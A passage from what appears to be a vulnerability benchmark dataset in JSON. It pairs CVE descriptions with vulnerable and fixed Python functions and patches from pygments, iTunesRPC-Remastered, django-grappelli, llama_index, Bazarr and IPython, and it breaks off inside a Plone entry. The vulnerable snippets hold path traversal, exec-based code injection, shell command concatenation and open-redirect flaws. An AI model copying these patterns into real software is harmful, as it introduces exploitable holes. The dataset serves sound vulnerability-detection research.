        "snippet": "    def analyse_text(text):\n        rv = 0.0\n        # dbt's ref function\n        if re.search(r'\\{\\{\\s*ref\\(.*\\)\\s*\\}\\}', text):\n            rv += 0.4\n        # dbt's source function\n        if re.search(r'\\{\\{\\s*source\\(.*\\)\\s*\\}\\}', text):\n            rv += 0.25\n        # Jinja macro\n        if re.search(\n            r'\\{%-?\\s*macro \\w+\\(.*\\)\\s*-?%\\}\\s+.*\\s+\\{%-?\\s*endmacro\\s*-?%\\}',\n            text,\n            re.S,\n        ):\n            rv += 0.15\n        return rv"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_191_1",
        "commit": "97eb3d5",
        "file_path": "pygments/lexers/templates.py",
        "start_line": 2285,
        "end_line": 2296,
        "snippet": "    def analyse_text(text):\n        rv = 0.0\n        # dbt's ref function\n        if re.search(r'\\{\\{\\s*ref\\(.*\\)\\s*\\}\\}', text):\n            rv += 0.4\n        # dbt's source function\n        if re.search(r'\\{\\{\\s*source\\(.*\\)\\s*\\}\\}', text):\n            rv += 0.25\n        # Jinja macro\n        if re.search(r'\\{%-?\\s*macro \\w+\\(.*\\)\\s*-?%\\}', text):\n            rv += 0.15\n        return rv"
      }
    ],
    "vul_patch": "--- a/pygments/lexers/templates.py\n+++ b/pygments/lexers/templates.py\n@@ -7,10 +7,6 @@\n         if re.search(r'\\{\\{\\s*source\\(.*\\)\\s*\\}\\}', text):\n             rv += 0.25\n         # Jinja macro\n-        if re.search(\n-            r'\\{%-?\\s*macro \\w+\\(.*\\)\\s*-?%\\}\\s+.*\\s+\\{%-?\\s*endmacro\\s*-?%\\}',\n-            text,\n-            re.S,\n-        ):\n+        if re.search(r'\\{%-?\\s*macro \\w+\\(.*\\)\\s*-?%\\}', text):\n             rv += 0.15\n         return rv\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-23609",
    "cve_description": "iTunesRPC-Remastered is a Discord Rich Presence for iTunes on Windows utility. In affected versions iTunesRPC-Remastered did not properly sanitize user input used to remove files leading to file deletion only limited by the process permissions. Users are advised to upgrade as soon as possible.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/bildsben/iTunesRPC-Remastered",
    "patch_url": [
      "https://github.com/bildsben/iTunesRPC-Remastered/commit/1eb1e5428f0926b2829a0bbbb65b0d946e608593"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_258_1",
        "commit": "1bda8d1",
        "file_path": "upload/server.py",
        "start_line": 108,
        "end_line": 206,
        "snippet": "def uploadimage():\n    # print(request.json)\n    if not request.json or \"image\" not in request.json:\n        print(\"No data sent or no image provided. Aborting with 400.\")\n        abort(400)\n\n    im_b64 = request.json[\"image\"]\n    img_bytes = base64.b64decode(im_b64.encode(\"utf-8\"))\n    img_bytes, valid = allowed_file(img_bytes)\n    if not valid:\n        return escape({\"entry\": \"False\"})\n    img = Image.open(io.BytesIO(img_bytes))\n\n    file_ending = img.format\n    print(f\"File has filetype {file_ending}.\")\n\n    if file_ending == \"JPEG\":\n        file_ending = \".jpg\"\n    else:\n        file_ending = \".png\"\n\n    one_hundred_million = 100000000\n    lots_of_nine = 999999999\n\n    file_name = None\n\n    f = open(\"all_files\", \"r\")\n    all_files = ast.literal_eval(f.read())\n    f.close()\n\n    attempt = 0\n\n    while file_name is None or file_name in all_files:\n        if attempt <= 1000:\n            file_name = random.randint(one_hundred_million, lots_of_nine)\n\n            file_name = base64.b64encode(str(file_name).encode(\"utf-8\")).decode(\"utf-8\")\n\n            print(f\"Trying new file name: {file_name}\")\n        else:\n            attempt = 0\n            one_hundred_million += 100000\n            lots_of_nine += 1000000\n\n            while one_hundred_million >= lots_of_nine:\n                one_hundred_million -= 10000\n\n            one_hundred_million -= 10000\n\n    print(f\"Successful file name: {file_name}\")\n\n    title = request.json[\"title\"]\n    if title[:9] == \"[PAUSED] \":\n        title = title[9::]\n\n    singer = request.json[\"singer\"]\n    album = request.json[\"album\"]\n\n    file_db_entry = [\n        {\"title\": title, \"singer\": singer, \"album\": album},\n        file_name,\n        file_ending,\n    ]\n    print(f\"New db entry: {file_db_entry}\")\n\n    all_files.append(file_db_entry)\n\n    # caching\n    # we want a limit of X amount of files as defined by the config\n\n    # 1. see how long the list is\n    # 2. if it is over get_config()'s cache limit, delete value [0]\n    # 3. delete it on disk.\n\n    cache, x, y = get_config()\n    del x\n    del y\n\n    length = len(all_files)\n    while (\n        length > cache\n    ):  # if it is not over the limit, it will skip. if it is, it does this.\n        # if we have gone over our cache limit, let's delete the first entry.\n        filename = all_files[0][1] + all_files[0][2]\n        remove(filename)\n        del all_files[0]\n        length = len(all_files)\n\n    f = open(\"all_files\", \"w\")\n    f.write(str(all_files))\n    f.close()\n\n    file_name = file_name + file_ending\n\n    img.save(file_name)\n\n    print(f\"Saved {file_name} from {file_db_entry}.\")\n    print(f\"Returning {file_db_entry}.\")\n    return escape(str({\"entry\": file_db_entry}))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_258_1",
        "commit": "1eb1e54",
        "file_path": "upload/server.py",
        "start_line": 108,
        "end_line": 206,
        "snippet": "def uploadimage():\n    # print(request.json)\n    if not request.json or \"image\" not in request.json:\n        print(\"No data sent or no image provided. Aborting with 400.\")\n        abort(400)\n\n    im_b64 = request.json[\"image\"]\n    img_bytes = base64.b64decode(im_b64.encode(\"utf-8\"))\n    img_bytes, valid = allowed_file(img_bytes)\n    if not valid:\n        return escape({\"entry\": \"False\"})\n    img = Image.open(io.BytesIO(img_bytes))\n\n    file_ending = img.format\n    print(f\"File has filetype {file_ending}.\")\n\n    if file_ending == \"JPEG\":\n        file_ending = \".jpg\"\n    else:\n        file_ending = \".png\"\n\n    one_hundred_million = 100000000\n    lots_of_nine = 999999999\n\n    file_name = None\n\n    f = open(\"all_files\", \"r\")\n    all_files = ast.literal_eval(f.read())\n    f.close()\n\n    attempt = 0\n\n    while file_name is None or file_name in all_files:\n        if attempt <= 1000:\n            file_name = random.randint(one_hundred_million, lots_of_nine)\n\n            file_name = base64.b64encode(str(file_name).encode(\"utf-8\")).decode(\"utf-8\")\n\n            print(f\"Trying new file name: {file_name}\")\n        else:\n            attempt = 0\n            one_hundred_million += 100000\n            lots_of_nine += 1000000\n\n            while one_hundred_million >= lots_of_nine:\n                one_hundred_million -= 10000\n\n            one_hundred_million -= 10000\n\n    print(f\"Successful file name: {file_name}\")\n\n    title = request.json[\"title\"]\n    if title[:9] == \"[PAUSED] \":\n        title = title[9::]\n\n    singer = request.json[\"singer\"]\n    album = request.json[\"album\"]\n\n    file_db_entry = [\n        {\"title\": title, \"singer\": singer, \"album\": album},\n        file_name,\n        file_ending,\n    ]\n    print(f\"New db entry: {file_db_entry}\")\n\n    all_files.append(file_db_entry)\n\n    # caching\n    # we want a limit of X amount of files as defined by the config\n\n    # 1. see how long the list is\n    # 2. if it is over get_config()'s cache limit, delete value [0]\n    # 3. delete it on disk.\n\n    cache, x, y = get_config()\n    del x\n    del y\n\n    length = len(all_files)\n    while (\n        length > cache\n    ):  # if it is not over the limit, it will skip. if it is, it does this.\n        # if we have gone over our cache limit, let's delete the first entry.\n        filename = all_files[0][1] + all_files[0][2]\n        remove(werkzeug.utils.secure_filename(filename))\n        del all_files[0]\n        length = len(all_files)\n\n    f = open(\"all_files\", \"w\")\n    f.write(str(all_files))\n    f.close()\n\n    file_name = file_name + file_ending\n\n    img.save(file_name)\n\n    print(f\"Saved {file_name} from {file_db_entry}.\")\n    print(f\"Returning {file_db_entry}.\")\n    return escape(str({\"entry\": file_db_entry}))"
      }
    ],
    "vul_patch": "--- a/upload/server.py\n+++ b/upload/server.py\n@@ -82,7 +82,7 @@\n     ):  # if it is not over the limit, it will skip. if it is, it does this.\n         # if we have gone over our cache limit, let's delete the first entry.\n         filename = all_files[0][1] + all_files[0][2]\n-        remove(filename)\n+        remove(werkzeug.utils.secure_filename(filename))\n         del all_files[0]\n         length = len(all_files)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-46898",
    "cve_description": "views/switch.py in django-grappelli (aka Django Grappelli) before 2.15.2 attempts to prevent external redirection with startswith(\"/\") but this does not consider a protocol-relative URL (e.g., //example.com) attack.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/sehmaschine/django-grappelli",
    "patch_url": [
      "https://github.com/sehmaschine/django-grappelli/commit/4ca94bcda0fa2720594506853d85e00c8212968f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_128_1",
        "commit": "55f88d6",
        "file_path": "grappelli/views/switch.py",
        "start_line": 23,
        "end_line": 69,
        "snippet": "def switch_user(request, object_id):\n\n    # current/session user\n    current_user = request.user\n    session_user = request.session.get(\"original_user\", {\"id\": current_user.id, \"username\": current_user.get_username()})\n\n    # check redirect\n    redirect_url = request.GET.get(\"redirect\", None)\n    if redirect_url is None or not redirect_url.startswith(\"/\"):\n        raise Http404()\n\n    # check original_user\n    try:\n        original_user = User.objects.get(pk=session_user[\"id\"], is_staff=True)\n        if not SWITCH_USER_ORIGINAL(original_user):\n            messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n            return redirect(request.GET.get(\"redirect\"))\n    except ObjectDoesNotExist:\n        msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(session_user[\"id\"])}\n        messages.add_message(request, messages.ERROR, msg)\n        return redirect(request.GET.get(\"redirect\"))\n\n    # check new user\n    try:\n        target_user = User.objects.get(pk=object_id, is_staff=True)\n        if target_user != original_user and not SWITCH_USER_TARGET(original_user, target_user):\n            messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n            return redirect(request.GET.get(\"redirect\"))\n    except ObjectDoesNotExist:\n        msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(object_id)}\n        messages.add_message(request, messages.ERROR, msg)\n        return redirect(request.GET.get(\"redirect\"))\n\n    # find backend\n    if not hasattr(target_user, 'backend'):\n        for backend in settings.AUTHENTICATION_BACKENDS:\n            if target_user == load_backend(backend).get_user(target_user.pk):\n                target_user.backend = backend\n                break\n\n    # target user login, set original as session\n    if hasattr(target_user, 'backend'):\n        login(request, target_user)\n        if original_user.id != target_user.id:\n            request.session[\"original_user\"] = {\"id\": original_user.id, \"username\": original_user.get_username()}\n\n    return redirect(request.GET.get(\"redirect\"))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_128_1",
        "commit": "4ca94bc",
        "file_path": "grappelli/views/switch.py",
        "start_line": 24,
        "end_line": 75,
        "snippet": "def switch_user(request, object_id):\n\n    # current/session user\n    current_user = request.user\n    session_user = request.session.get(\"original_user\", {\"id\": current_user.id, \"username\": current_user.get_username()})\n\n    # check redirect\n    redirect_url = request.GET.get(\"redirect\", None)\n    if redirect_url is None or not \\\n        url_has_allowed_host_and_scheme(\n            url=redirect_url,\n            allowed_hosts={request.get_host()},\n            require_https=request.is_secure(),\n        ):\n        raise Http404()\n        \n    # check original_user\n    try:\n        original_user = User.objects.get(pk=session_user[\"id\"], is_staff=True)\n        if not SWITCH_USER_ORIGINAL(original_user):\n            messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n            return redirect(redirect_url)\n    except ObjectDoesNotExist:\n        msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(session_user[\"id\"])}\n        messages.add_message(request, messages.ERROR, msg)\n        return redirect(redirect_url)\n\n    # check new user\n    try:\n        target_user = User.objects.get(pk=object_id, is_staff=True)\n        if target_user != original_user and not SWITCH_USER_TARGET(original_user, target_user):\n            messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n            return redirect(redirect_url)\n    except ObjectDoesNotExist:\n        msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(object_id)}\n        messages.add_message(request, messages.ERROR, msg)\n        return redirect(redirect_url)\n\n    # find backend\n    if not hasattr(target_user, 'backend'):\n        for backend in settings.AUTHENTICATION_BACKENDS:\n            if target_user == load_backend(backend).get_user(target_user.pk):\n                target_user.backend = backend\n                break\n\n    # target user login, set original as session\n    if hasattr(target_user, 'backend'):\n        login(request, target_user)\n        if original_user.id != target_user.id:\n            request.session[\"original_user\"] = {\"id\": original_user.id, \"username\": original_user.get_username()}\n\n    return redirect(redirect_url)"
      }
    ],
    "vul_patch": "--- a/grappelli/views/switch.py\n+++ b/grappelli/views/switch.py\n@@ -6,30 +6,35 @@\n \n     # check redirect\n     redirect_url = request.GET.get(\"redirect\", None)\n-    if redirect_url is None or not redirect_url.startswith(\"/\"):\n+    if redirect_url is None or not \\\n+        url_has_allowed_host_and_scheme(\n+            url=redirect_url,\n+            allowed_hosts={request.get_host()},\n+            require_https=request.is_secure(),\n+        ):\n         raise Http404()\n-\n+        \n     # check original_user\n     try:\n         original_user = User.objects.get(pk=session_user[\"id\"], is_staff=True)\n         if not SWITCH_USER_ORIGINAL(original_user):\n             messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n-            return redirect(request.GET.get(\"redirect\"))\n+            return redirect(redirect_url)\n     except ObjectDoesNotExist:\n         msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(session_user[\"id\"])}\n         messages.add_message(request, messages.ERROR, msg)\n-        return redirect(request.GET.get(\"redirect\"))\n+        return redirect(redirect_url)\n \n     # check new user\n     try:\n         target_user = User.objects.get(pk=object_id, is_staff=True)\n         if target_user != original_user and not SWITCH_USER_TARGET(original_user, target_user):\n             messages.add_message(request, messages.ERROR, _(\"Permission denied.\"))\n-            return redirect(request.GET.get(\"redirect\"))\n+            return redirect(redirect_url)\n     except ObjectDoesNotExist:\n         msg = _('%(name)s object with primary key %(key)r does not exist.') % {'name': \"User\", 'key': escape(object_id)}\n         messages.add_message(request, messages.ERROR, msg)\n-        return redirect(request.GET.get(\"redirect\"))\n+        return redirect(redirect_url)\n \n     # find backend\n     if not hasattr(target_user, 'backend'):\n@@ -44,4 +49,4 @@\n         if original_user.id != target_user.id:\n             request.session[\"original_user\"] = {\"id\": original_user.id, \"username\": original_user.get_username()}\n \n-    return redirect(request.GET.get(\"redirect\"))\n+    return redirect(redirect_url)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-45201",
    "cve_description": "An issue was discovered in llama_index before 0.10.38. download/integration.py includes an exec call for import {cls_name}.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/run-llama/llama_index",
    "patch_url": [
      "https://github.com/run-llama/llama_index/commit/bd827c30484fa085ec769fa55dc7f2add8006ac8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_78_1",
        "commit": "ece8f2d",
        "file_path": "llama-index-core/llama_index/core/download/integration.py",
        "start_line": "13",
        "end_line": "28",
        "snippet": "def download_integration(module_str: str, module_import_str: str, cls_name: str) -> Any:\n    \"\"\"Returns an integration class by first pip installing its parent module.\"\"\"\n    try:\n        pip_install(module_str)  # this works for any integration not just packs\n    except Exception as e:\n        raise Exception(f\"Failed to pip install `{module_str}`\") from e\n\n    try:\n        exec(f\"from {module_import_str} import {cls_name}\")\n        module_spec = importlib.util.find_spec(module_import_str)\n        module = importlib.util.module_from_spec(module_spec)\n        module_spec.loader.exec_module(module)\n        pack_cls = getattr(module, cls_name)\n    except ImportError as e:\n        raise ImportError(f\"Unable to import {cls_name}\") from e\n    return pack_cls"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_78_1",
        "commit": "bd827c3",
        "file_path": "llama-index-core/llama_index/core/download/integration.py",
        "start_line": "13",
        "end_line": "27",
        "snippet": "def download_integration(module_str: str, module_import_str: str, cls_name: str) -> Any:\n    \"\"\"Returns an integration class by first pip installing its parent module.\"\"\"\n    try:\n        pip_install(module_str)  # this works for any integration not just packs\n    except Exception as e:\n        raise Exception(f\"Failed to pip install `{module_str}`\") from e\n\n    try:\n        module_spec = importlib.util.find_spec(module_import_str)\n        module = importlib.util.module_from_spec(module_spec)\n        module_spec.loader.exec_module(module)\n        pack_cls = getattr(module, cls_name)\n    except ImportError as e:\n        raise ImportError(f\"Unable to import {cls_name}\") from e\n    return pack_cls"
      }
    ],
    "vul_patch": "--- a/llama-index-core/llama_index/core/download/integration.py\n+++ b/llama-index-core/llama_index/core/download/integration.py\n@@ -6,7 +6,6 @@\n         raise Exception(f\"Failed to pip install `{module_str}`\") from e\n \n     try:\n-        exec(f\"from {module_import_str} import {cls_name}\")\n         module_spec = importlib.util.find_spec(module_import_str)\n         module = importlib.util.module_from_spec(module_spec)\n         module_spec.loader.exec_module(module)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-50264",
    "cve_description": "Bazarr manages and downloads subtitles. Prior to 1.3.1, Bazarr contains an arbitrary file read in /system/backup/download/ endpoint in bazarr/app/ui.py does not validate the user-controlled filename variable and uses it in the send_file function, which leads to an arbitrary file read on the system. This issue is fixed in version 1.3.1.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/morpheus65535/bazarr",
    "patch_url": [
      "https://github.com/morpheus65535/bazarr/commit/17add7fbb3ae1919a40d505470d499d46df9ae6b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_187_1",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 145,
        "end_line": 146,
        "snippet": "def backup_download(filename):\n    return send_file(os.path.join(settings.backup.folder, filename), max_age=0, as_attachment=True)"
      },
      {
        "id": "vul_py_187_2",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 150,
        "end_line": 152,
        "snippet": "def swaggerui_static(filename):\n    return send_file(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n                     'static', filename))"
      },
      {
        "id": "vul_py_187_3",
        "commit": "aa0af3f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 162,
        "end_line": 183,
        "snippet": "def proxy(protocol, url):\n    url = protocol + '://' + unquote(url)\n    params = request.args\n    try:\n        result = requests.get(url, params, allow_redirects=False, verify=False, timeout=5, headers=headers)\n    except Exception as e:\n        return dict(status=False, error=repr(e))\n    else:\n        if result.status_code == 200:\n            try:\n                version = result.json()['version']\n                return dict(status=True, version=version)\n            except Exception:\n                return dict(status=False, error='Error Occurred. Check your settings.')\n        elif result.status_code == 401:\n            return dict(status=False, error='Access Denied. Check API key.')\n        elif result.status_code == 404:\n            return dict(status=False, error='Cannot get version. Maybe unsupported legacy API call?')\n        elif 300 <= result.status_code <= 399:\n            return dict(status=False, error='Wrong URL Base.')\n        else:\n            return dict(status=False, error=result.raise_for_status())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_187_1",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 145,
        "end_line": 150,
        "snippet": "def backup_download(filename):\n    fullpath = os.path.normpath(os.path.join(settings.backup.folder, filename))\n    if not fullpath.startswith(settings.backup.folder):\n        return '', 404\n    else:\n        return send_file(fullpath, max_age=0, as_attachment=True)"
      },
      {
        "id": "fix_py_187_2",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 154,
        "end_line": 161,
        "snippet": "def swaggerui_static(filename):\n    basepath = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n                            'static')\n    fullpath = os.path.join(basepath, filename)\n    if not fullpath.startswith(basepath):\n        return '', 404\n    else:\n        return send_file(fullpath)"
      },
      {
        "id": "fix_py_187_3",
        "commit": "17add7f",
        "file_path": "bazarr/app/ui.py",
        "start_line": 171,
        "end_line": 194,
        "snippet": "def proxy(protocol, url):\n    if protocol.lower not in ['http', 'https']:\n        return dict(status=False, error='Unsupported protocol')\n    url = protocol + '://' + unquote(url)\n    params = request.args\n    try:\n        result = requests.get(url, params, allow_redirects=False, verify=False, timeout=5, headers=headers)\n    except Exception as e:\n        return dict(status=False, error=repr(e))\n    else:\n        if result.status_code == 200:\n            try:\n                version = result.json()['version']\n                return dict(status=True, version=version)\n            except Exception:\n                return dict(status=False, error='Error Occurred. Check your settings.')\n        elif result.status_code == 401:\n            return dict(status=False, error='Access Denied. Check API key.')\n        elif result.status_code == 404:\n            return dict(status=False, error='Cannot get version. Maybe unsupported legacy API call?')\n        elif 300 <= result.status_code <= 399:\n            return dict(status=False, error='Wrong URL Base.')\n        else:\n            return dict(status=False, error=result.raise_for_status())"
      }
    ],
    "vul_patch": "--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,2 +1,6 @@\n def backup_download(filename):\n-    return send_file(os.path.join(settings.backup.folder, filename), max_age=0, as_attachment=True)\n+    fullpath = os.path.normpath(os.path.join(settings.backup.folder, filename))\n+    if not fullpath.startswith(settings.backup.folder):\n+        return '', 404\n+    else:\n+        return send_file(fullpath, max_age=0, as_attachment=True)\n\n--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,3 +1,8 @@\n def swaggerui_static(filename):\n-    return send_file(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n-                     'static', filename))\n+    basepath = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n+                            'static')\n+    fullpath = os.path.join(basepath, filename)\n+    if not fullpath.startswith(basepath):\n+        return '', 404\n+    else:\n+        return send_file(fullpath)\n\n--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,4 +1,6 @@\n def proxy(protocol, url):\n+    if protocol.lower not in ['http', 'https']:\n+        return dict(status=False, error='Unsupported protocol')\n     url = protocol + '://' + unquote(url)\n     params = request.args\n     try:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-24816",
    "cve_description": "IPython (Interactive Python) is a command shell for interactive computing in multiple programming languages, originally developed for the Python programming language. Versions prior to 8.1.0 are subject to a command injection vulnerability with very specific prerequisites. This vulnerability requires that the function `IPython.utils.terminal.set_term_title` be called on Windows in a Python environment where ctypes is not available. The dependency on `ctypes` in `IPython.utils._process_win32` prevents the vulnerable code from ever being reached in the ipython binary. However, as a library that could be used by another tool `set_term_title` could be called and hence introduce a vulnerability. Should an attacker get untrusted input to an instance of this function they would be able to inject shell commands as current process and limited to the scope of the current process. Users of ipython as a library are advised to upgrade. Users unable to upgrade should ensure that any calls to the `IPython.utils.terminal.set_term_title` function are done with trusted or filtered input.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ipython/ipython",
    "patch_url": [
      "https://github.com/ipython/ipython/commit/385d69325319a5972ee9b5983638e3617f21cb1f",
      "https://github.com/ipython/ipython/commit/991849c247fc208628879e7ca2923b3c218a5a75"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_95_1",
        "commit": "e548ee2",
        "file_path": "IPython/utils/terminal.py",
        "start_line": "88",
        "end_line": "117",
        "snippet": "if os.name == 'posix':\n    TERM = os.environ.get('TERM','')\n    if TERM.startswith('xterm'):\n        _set_term_title = _set_term_title_xterm\n        _restore_term_title = _restore_term_title_xterm\nelif sys.platform == 'win32':\n    try:\n        import ctypes\n\n        SetConsoleTitleW = ctypes.windll.kernel32.SetConsoleTitleW\n        SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]\n    \n        def _set_term_title(title):\n            \"\"\"Set terminal title using ctypes to access the Win32 APIs.\"\"\"\n            SetConsoleTitleW(title)\n    except ImportError:\n        def _set_term_title(title):\n            \"\"\"Set terminal title using the 'title' command.\"\"\"\n            global ignore_termtitle\n\n            try:\n                # Cannot be on network share when issuing system commands\n                curr = os.getcwd()\n                os.chdir(\"C:\")\n                ret = os.system(\"title \" + title)\n            finally:\n                os.chdir(curr)\n            if ret:\n                # non-zero return code signals error, don't try again\n                ignore_termtitle = True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_95_1",
        "commit": "385d693",
        "file_path": "IPython/utils/terminal.py",
        "start_line": "88",
        "end_line": "101",
        "snippet": "if os.name == 'posix':\n    TERM = os.environ.get('TERM','')\n    if TERM.startswith('xterm'):\n        _set_term_title = _set_term_title_xterm\n        _restore_term_title = _restore_term_title_xterm\nelif sys.platform == 'win32':\n    import ctypes\n\n    SetConsoleTitleW = ctypes.windll.kernel32.SetConsoleTitleW\n    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]\n\n    def _set_term_title(title):\n        \"\"\"Set terminal title using ctypes to access the Win32 APIs.\"\"\"\n        SetConsoleTitleW(title)"
      }
    ],
    "vul_patch": "--- a/IPython/utils/terminal.py\n+++ b/IPython/utils/terminal.py\n@@ -4,27 +4,11 @@\n         _set_term_title = _set_term_title_xterm\n         _restore_term_title = _restore_term_title_xterm\n elif sys.platform == 'win32':\n-    try:\n-        import ctypes\n+    import ctypes\n \n-        SetConsoleTitleW = ctypes.windll.kernel32.SetConsoleTitleW\n-        SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]\n-    \n-        def _set_term_title(title):\n-            \"\"\"Set terminal title using ctypes to access the Win32 APIs.\"\"\"\n-            SetConsoleTitleW(title)\n-    except ImportError:\n-        def _set_term_title(title):\n-            \"\"\"Set terminal title using the 'title' command.\"\"\"\n-            global ignore_termtitle\n+    SetConsoleTitleW = ctypes.windll.kernel32.SetConsoleTitleW\n+    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]\n \n-            try:\n-                # Cannot be on network share when issuing system commands\n-                curr = os.getcwd()\n-                os.chdir(\"C:\")\n-                ret = os.system(\"title \" + title)\n-            finally:\n-                os.chdir(curr)\n-            if ret:\n-                # non-zero return code signals error, don't try again\n-                ignore_termtitle = True\n+    def _set_term_title(title):\n+        \"\"\"Set terminal title using ctypes to access the Win32 APIs.\"\"\"\n+        SetConsoleTitleW(title)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-32806",
    "cve_description": "Products.isurlinportal is a replacement for isURLInPortal method in Plone. Versions of Products.isurlinportal prior to 1.2.0 have an Open Redirect vulnerability. Various parts of Plone use the 'is url in portal' check for security, mostly to see if it is safe to redirect to a url. A url like `https://example.org` is not in the portal. The url `https:example.org` without slashes is considered to be in the portal. When redirecting, some browsers go to `https://example.org`, others give an error. Attackers may use this to redirect victims to their site, especially as part of a phishing attack. The problem has been patched in Products.isurlinportal 1.2.0.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/plone/Products.isurlinportal",
    "patch_url": [
      "https://github.com/plone/Products.isurlinportal/commit/d4fd34990d18adf05a10dc5e2bb4b066798280ba"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_106_1",
        "commit": "a52a08c",
        "file_path": "Products/isurlinportal/__init__.py",
        "start_line": 91,
        "end_line": 174,
